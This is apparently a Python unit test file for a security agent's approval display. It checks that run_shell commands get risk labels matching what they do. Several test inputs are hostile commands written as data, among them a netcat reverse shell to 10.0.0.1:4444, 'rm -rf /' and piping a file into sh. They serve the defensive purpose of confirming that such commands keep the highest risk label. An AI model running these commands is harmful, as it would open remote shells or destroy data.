"""#2a: command-aware risk display for run_shell (display only — the
PermissionEngine gate is unchanged).

On the RootMe run every `curl` showed as "R5 privileged local action", driving
approval fatigue. The label now reflects the actual command, but only downgrades
for an unambiguous single-executable read command; anything privileged,
destructive, or compound keeps the conservative R5 so risk is never understated.
"""
from __future__ import annotations

import unittest

import secops_agent.main  # noqa: F401  # populate the tool registry
from secops_agent.core.permissions import PermissionResource
from secops_agent.ui.tool_display import _approval_risk_label

_RUN_SHELL = PermissionResource(kind="tool", name="run_shell")


class CommandAwareRiskLabelTests(unittest.TestCase):
    def _label(self, command: str) -> str:
        return _approval_risk_label("run_shell", _RUN_SHELL, {"command": command})

    def test_network_read_downgrades_from_r5(self):
        self.assertIn("R2 network", self._label("curl -sL http://10.0.0.1/panel/"))
        self.assertIn("R2 network", self._label("dig example.com"))

    def test_local_read_is_r1(self):
        self.assertIn("R1 local", self._label("ls -la /tmp"))

    def test_privileged_and_destructive_stay_conservative(self):
        for cmd in ("sudo openvpn --config x", "rm -rf /tmp/x", "nc -e /bin/sh 10.0.0.1 4444"):
            self.assertIn("R5 privileged", self._label(cmd), cmd)

    def test_compound_command_is_never_understated(self):
        self.assertIn("R5 privileged", self._label("curl http://x && rm -rf /"))
        self.assertIn("R5 privileged", self._label("cat f | sh"))

    def test_non_shell_tool_is_unchanged(self):
        label = _approval_risk_label("nmap_scan", PermissionResource(kind="tool", name="nmap_scan"), {"target": "x"})
        self.assertIn("R3 active enumeration", label)


if __name__ == "__main__":
    unittest.main()
